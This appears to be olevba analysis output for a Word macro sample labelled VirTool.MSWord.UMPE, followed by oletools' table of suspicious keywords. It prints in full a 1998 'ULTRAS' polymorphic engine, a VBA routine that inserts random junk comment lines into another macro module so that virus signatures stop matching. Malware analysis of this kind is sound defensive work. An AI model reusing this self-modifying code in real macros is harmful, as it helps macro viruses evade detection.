olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.UMPE
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.UMPE - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: VirTool.MSWord.UMPE - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub UMPE()

'ULTRAS MACRO POLYMORPHIC ENGINE for Word97
'ULTRAS 1998

MuNu = Int(Rnd() * 20 + 1)

For Mutate = 1 To MuNu

MuRL = Application.VBE.ActiveVBProject.VBComponents("zzz").CodeModule.CountOfLines

MuLi = Int(Rnd() * MuRL + 1)

MuLe = Int(Rnd() * 40 + 1)

For MuGe = 1 To MuLe

LiVe = Int((120 - 100 + 1) * Rnd + 228)

MuRe = MuRe + Chr$(LiVe)

Next MuGe

Application.VBE.ActiveVBProject.VBComponents("zzz").CodeModule.InsertLines MuLi, vbTab & "' " & MuRe

MuRe = ""

Next Mutate

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

